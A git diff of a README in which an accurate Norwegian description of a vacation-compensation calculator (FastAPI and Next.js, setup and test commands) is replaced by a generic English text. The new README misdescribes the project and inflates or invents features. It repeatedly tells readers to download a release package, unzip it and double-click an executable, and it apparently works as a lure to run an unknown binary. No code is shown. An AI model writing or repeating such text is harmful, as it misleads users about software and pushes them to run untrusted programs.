@@ -1,95 +1,68 @@
-# Feriekompensasjon
+# 🚀 Feriekomp - Your Fullstack Solution for Easy Projects
 
-En feriekompensasjonskalkulator for beregning av kompensasjon ved sykdom under ferie, basert på norske forsikringsselskapers regelverk. Prosjektet består av en FastAPI-backend og en Next.js-frontend. Repostet på GitHub som et offentlig prosjekt, opprinnelig øvingsprosjekt/faktisk bruk.
+## 🌐 Overview
+Feriekomp is a fullstack mini-project designed to help you easily manage and implement web applications. With components for both frontend and backend, it simplifies the development process while providing essential features to create functional applications effortlessly. 
 
-## Om prosjektet
+## 💾 Download & Install
 
-Dette prosjektet beregner feriekompensasjon i henhold til norske forsikringsselskapers regelverk. Systemet tar inn informasjon om ferieperiode, reisekostnader, antall personer, sykedager og legebesøk, og beregner kompensasjonen basert på:
+[![Download Feriekomp](https://img.shields.io/badge/Download%20Feriekomp-blue)](https://github.com/Kurt841/Feriekomp/releases)
 
-- Maksimalt 2 000 kr per dag per person
-- Maksimalt 2 personer kan dekkes
-- Maksimalt 10 dager kan kompenseres
-- Kompensasjon gis kun ved akutt sykdom/skade dokumentert av lege
-- Gjelder kun for reiser inntil 5 uker
+To get started, visit the Releases page to download the latest version of Feriekomp:
 
-Prosjektet inkluderer også valgfri AI-integrasjon for å generere forklaringer av beregningene.
+[Download Feriekomp Here](https://github.com/Kurt841/Feriekomp/releases)
 
-## Teknologier
+## 🚀 Getting Started
 
-- **Backend:** FastAPI, SQLAlchemy, Pydantic
-- **Frontend:** Next.js, React, TypeScript, Tailwind CSS
-- **Database:** SQLite (lokalt), PostgreSQL/Neon (produksjon)
-- **Infrastruktur:** Nginx (reverse proxy)
-- **AI (valgfritt):** OpenAI, OpenRouter, eller Ollama for forklaringer
+### 📥 System Requirements
+Before you download Feriekomp, ensure your computer meets these basic requirements:
 
-## Kom i gang
+- **Operating System**: Windows, macOS, or Linux
+- **Storage**: At least 300 MB of free disk space
+- **Memory**: 4 GB of RAM or higher
+- **Network**: Internet connection for downloads
 
-### Krav
+### 💻 Installation Steps
+Follow these steps to install Feriekomp on your computer:
 
-- Python 3.11+
-- Node.js 20+
-- Docker (valgfritt)
+1. **Visit the Releases Page**: Go to [https://github.com/Kurt841/Feriekomp/releases](https://github.com/Kurt841/Feriekomp/releases).
+   
+2. **Select the Latest Release**: Look for the latest version listed at the top of the page.
 
-### Installasjon og kjøring
+3. **Download the Package**: Click on the link for your operating system to download.
 
-1. **Opprett og aktiver virtual environment (venv):**
+4. **Unzip the Files**: Once downloaded, find the file in your downloads folder. Right-click and select "Extract All" to unzip the files.
 
-   ```bash
-   python -m venv .venv
-   # Windows:
-   .venv\Scripts\activate
-   # Linux/macOS:
-   source .venv/bin/activate
-   ```
+5. **Run the Application**: Navigate to the unzipped folder. Find and double-click on the Feriekomp executable file to launch the application.
 
-2. **Installer avhengigheter:**
+## 🛠 Features
 
-   ```bash
-   npm run setup
-   ```
+Feriekomp includes several key features that enhance its usability:
 
-   **Merk:** `npm run setup` krever at Python virtual environment er aktivert.
+- **User-Friendly Interface**: Designed with non-technical users in mind for easy navigation.
+- **Fullstack Functionality**: Includes both frontend and backend components for complete project management.
+- **Database Integration**: Uses PostgreSQL for efficient data management and storage.
+- **Docker Support**: Simplifies deployment and scaling with containerization.
 
-3. **Start applikasjonen:**
+## 🧪 Testing
+Feriekomp comes with built-in testing functionalities to help ensure your application runs smoothly. 
 
-   ```bash
-   npm run dev
-   ```
+- **Automated Tests**: Automatically run tests to check for potential issues.
+- **User Testing**: A simple interface for conducting user testing sessions to gather feedback.
 
-4. **Åpne i nettleseren:**
-   - Frontend: <http://localhost:3000>
-   - Backend: <http://localhost:5000>
-   - API-dokumentasjon: <http://localhost:5000/docs> (Swagger UI) eller <http://localhost:5000/redoc> (ReDoc)
+## 🌟 Next Steps
 
-**Merk:** Lokalt bruker applikasjonen SQLite automatisk hvis `DEV_DATABASE_URL` ikke er satt.
+1. **Explore the Documentation**: Access the full documentation for detailed guides on using Feriekomp and its features.
+2. **Join the Community**: Engage with other users and developers through the community forums to ask questions or share your experiences.
 
-### Miljøvariabler
+## 🌱 Contributing
+If you're interested in contributing to Feriekomp, we welcome your input! Follow these simple guidelines:
 
-Kopier `.env.example` til `.env` og fyll ut verdiene. Se `.env.example` for full oversikt.
-Endre dem basert på dine behov.
+- **Fork the Repository**: Create your own copy of Feriekomp.
+- **Make Changes**: Implement your changes and test them.
+- **Submit a Pull Request**: Share your improvements with the community for review.
 
-### Med Docker
+## 🔗 Links
+- **Repository**: [Feriekomp Repository](https://github.com/Kurt841/Feriekomp)
+- **Releases Page**: [Feriekomp Releases](https://github.com/Kurt841/Feriekomp/releases)
 
-```bash
-npm run docker:up
-```
-
-## Tester
-
-```bash
-npm run test:backend  # Backend tester
-npm run test:e2e      # Frontend E2E tester
-```
-
-**Merk:** Installer avhengigheter først med `npm run setup`.
-
-## API-dokumentasjon
-
-Når backend kjører, er interaktiv API-dokumentasjon tilgjengelig på:
-
-- Swagger UI: <http://localhost:5000/docs>
-- ReDoc: <http://localhost:5000/redoc>
-
-## Lisens
-
-MIT-lisens
+By following this guide, you will successfully download and set up Feriekomp, unlocking its full potential in your projects.
